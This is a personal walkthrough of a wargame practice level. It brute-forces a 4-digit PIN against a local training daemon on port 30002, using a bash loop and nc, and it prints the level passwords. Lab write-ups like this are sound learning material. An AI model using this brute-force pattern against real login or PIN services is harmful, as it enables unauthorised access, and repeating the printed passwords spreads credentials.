# Level 24-25: A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. You do not need to create new connections each time.

## Password
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
## Method
Created a script that will generate all combinations into one list, then submit all in one go to port 30002
```
vim banditscript.sh
```
```
#!/bin/bash

for i in {0000..9999}
do
echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> list.txt

done
```
- list.txt will contain all the passcode combinations, starting with the password for bandit24 (gb8k...) followed by the current value of $i.
- '>>' adds each ine of a combination to list.txt rather than overwriting it with one '>'.
- Each time the loop ran through 'for i in {0000..9999}' due to the use of the 'for', the variable $i was being assigned a different value e.g. from 0000 in the first combination then to 0001 in the second combination line and so on until 9999. This is called a **'for loop'** and everything between 'do' and 'done' is executed for each iteration of the loop.

I then submitted all combinations into port 30002 which reads line by line
```
cat list.txt | nc localhost 30002
```

**What I learned**: echo automatically adds a newline character [$] at the end of whatever it prints i.e. each time it was printing '"gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8' followed by a pincode value e.g. 0001, '$' was at the end of that combination line which is why the port was able to read each combination separately. 'cat -A' can be used to see hidden characters like the newline character.